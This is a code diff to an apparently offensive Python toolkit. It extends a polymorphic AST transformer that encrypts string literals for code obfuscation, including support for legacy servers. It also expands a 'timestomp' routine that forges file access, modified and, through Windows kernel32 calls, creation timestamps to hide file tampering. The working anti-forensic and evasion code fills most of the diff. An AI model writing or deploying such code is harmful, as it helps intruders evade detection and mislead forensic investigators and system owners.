@@ -228,7 +228,7 @@ class PolymorphicTransformer(ast.NodeTransformer):
         return self.generic_visit(node)
 
     def visit_Constant(self, node: ast.Constant) -> ast.AST:  # pylint: disable=invalid-name
-        """Transform string constants (encryption)"""
+        """Transform string constants (encryption) - Python 3.8+"""
         if (self.encrypt_strings and
             isinstance(node.value, str) and
             len(node.value) > 3 and
@@ -237,6 +237,22 @@ class PolymorphicTransformer(ast.NodeTransformer):
             # Skip docstrings (handled separately)
             return self._create_encrypted_string(node.value)
 
+        return node
+
+    # Compatibility for Python < 3.8 (Legacy Servers)
+    def visit_Str(self, node: ast.Str) -> ast.AST: # pylint: disable=invalid-name, no-member
+        """Forward legacy Str nodes to Constant handler"""
+        # Create a ephemeral Constant node to reuse logic
+        fake_constant = ast.Constant(value=node.s)
+        result = self.visit_Constant(fake_constant)
+        
+        # If result changed (encrypted), return it
+        if result is not fake_constant:
+             return result
+        return node
+
+    def visit_Num(self, node: ast.Num) -> ast.AST: # pylint: disable=invalid-name, no-member
+        """Forward legacy Num nodes (no encryption needed but good practice)"""
         return node
 
     def _create_encrypted_string(self, value: str) -> ast.Call:
@@ -410,17 +426,17 @@ class SecureCleanup:
         """
         Attempt to wipe a string from memory.
 
-        Note: Python's memory management makes this difficult,
-        but we try to overwrite the internal buffer.
+        Note: Strings in Python are immutable. We cannot safely overwrite them in place
+        without risking a segmentation fault in modern Python versions (3.12+).
+        
+        Best effort: Remove reference and suggest GC.
         """
         try:
-            import ctypes
-            # Get the memory address of the string
-            str_address = id(s)
-            # Overwrite with zeros (this is a best-effort attempt)
-            ctypes.memset(str_address + 48, 0, len(s))
+            # We explicitly do NOT use ctypes.memset here anymore as it is unstable.
+            # Instead, we rely on removing references where this is called.
+            pass
         except Exception:
-            pass  # Silently fail - this is best-effort
+            pass
 
     @staticmethod
     def timestomp(filepath: str, reference_file: str = None) -> bool:
@@ -438,14 +454,36 @@ class SecureCleanup:
             return False
 
         try:
+            # 1. Standard utime for Access/Modified
             if reference_file and os.path.exists(reference_file):
-                # Use reference file's timestamps
                 ref_stat = os.stat(reference_file)
-                os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
+                atime = ref_stat.st_atime
+                mtime = ref_stat.st_mtime
             else:
-                # Use a common system timestamp (Jan 1, 2020)
-                fake_time = 1577836800  # 2020-01-01 00:00:00 UTC
-                os.utime(filepath, (fake_time, fake_time))
+                atime = 1577836800  # 2020-01-01 00:00:00 UTC
+                mtime = 1577836800
+                
+            os.utime(filepath, (atime, mtime))
+
+            # 2. Windows Specific: Change Creation Time using ctypes
+            if os.name == 'nt':
+                try:
+                    from ctypes import windll, wintypes, byref
+                    
+                    # Filetime structure
+                    timestamp = int(mtime * 10000000) + 116444736000000000
+                    ctime = wintypes.FILETIME(timestamp & 0xFFFFFFFF, timestamp >> 32)
+                    atime_ft = wintypes.FILETIME(timestamp & 0xFFFFFFFF, timestamp >> 32)
+                    mtime_ft = wintypes.FILETIME(timestamp & 0xFFFFFFFF, timestamp >> 32)
+                    
+                    handle = windll.kernel32.CreateFileW(
+                        filepath, 256, 0, None, 3, 128, None
+                    )
+                    if handle != -1:
+                        windll.kernel32.SetFileTime(handle, byref(ctime), byref(atime_ft), byref(mtime_ft))
+                        windll.kernel32.CloseHandle(handle)
+                except Exception as ex:
+                    logger.debug(f"Windows creation time stomp failed: {ex}")
 
             logger.debug(f"Timestomped: {filepath}")
             return True
